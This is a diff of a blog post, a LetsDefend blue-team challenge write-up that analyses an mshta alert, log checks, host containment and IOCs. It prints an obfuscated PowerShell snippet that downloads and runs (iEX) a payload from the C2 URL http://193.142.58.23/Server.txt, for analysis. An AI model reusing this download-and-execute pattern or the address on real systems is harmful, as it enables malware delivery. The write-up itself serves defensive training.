@@ -9,7 +9,9 @@ categories:
   - DFIR
 ---
 
-I've been trying out [letsdefend.io](https://letsdefend.io/) for a couple of week, and here's a write up of one of the challenge. its a platform to hone your blue teaming skill, you play in a SIEM like apps and you act as an analyst, finding IOC and deciding escalation etc. so here goes.
+I've been trying out [letsdefend.io](https://letsdefend.io/) for a couple of week, and here's a write up of one of the challenge. its a platform to hone your blue teaming skill, you play in a SIEM like apps and you act as an analyst, finding IOC and deciding escalation etc. There are not a lot of blue team training site, and this concept is pretty nice. 
+
+Here goes the write up. 
 <!--more-->
 
 ![mshta behaviour](/images/wup_ld.png)
@@ -27,13 +29,10 @@ virustotal result are bad, 23/58 malicious flag. if we are interested we could t
 
 ![wup_endpoint](/images/wup_endpoint.png)
 
-We use end point security to find out what is really happening in the host 172.16.17.38. From the screenshot we can see that the first command line that trigger the alert, followed by weird command.
+We use end point security to find out what was happening in the host 172.16.17.38. From the screenshot we can see that the first command line that trigger the alert, followed by weird command.
 
 The first command is what triggered the alert. Mshta is a trusted Microsoft binary that in this case is abused to proxy for execution of the PS1.hta file. 
 you can see the related explanation here at the [MITRE](https://attack.mitre.org/techniques/T1218/005/)
-
-Tried a bit of magic at the second command below, where we can see a more bearable presentation. 
-$H3-H6 with the help of $H1 just basically hex that reads "Downloadstring". $H2 was a glorified "New-Object Net.WebClient". and $H8 puts them all together to form an old fashion download using powershell from address mentioned in $H8 (http://193.142.58.23/Server.txt).
 
 ```bash
 function H1($i) 
@@ -49,19 +48,22 @@ $H8 = $H2.$H7('http://193.142.58.23/Server.txt');
 iEX $H8
 ```
 
+Tried a bit of magic at the second command so it will be more readable. 
+$H3-H6 with the help of $H1 just basically hex that reads "Downloadstring". $H2 was a glorified "New-Object Net.WebClient". and $H8 puts them all together to form an old fashion download using powershell from address mentioned in $H8 (http://193.142.58.23/Server.txt). 
+
 #### log management
 
-After seeing what the script do, we best check log management and try to see did the server reply with anything.
+After seeing what the script do, we best check log management and try to see did the c2 server (193.142.58.23) reply with anything.
 
 ![wup_endpoint](/images/wup_logmgmt.png)
 
-apparently the server replied with 404, so no response arrived for the host (172.16.17.38) because the server (or the inteded file) is dead/ not there.
+apparently the server replied with 404, so no response arrived for the host (172.16.17.38) because the server is dead/ the file was not there.
 
 #### containment and lesson learned
 
 Since it's definetly a malicious script (but stopped due to the C2 server is dead), it's best to contain the host. We can do this by going to endpoint security and click the request containment. 
 
-The IP address, and URL and also the md5 hash of the executed file can then be use as IOC when we did the playbook and also close the case.
+Lastly, we can use the IP address, and URL and also the md5 hash of the executed file can as IOC when we did the playbook and also close the case.
 
 
 
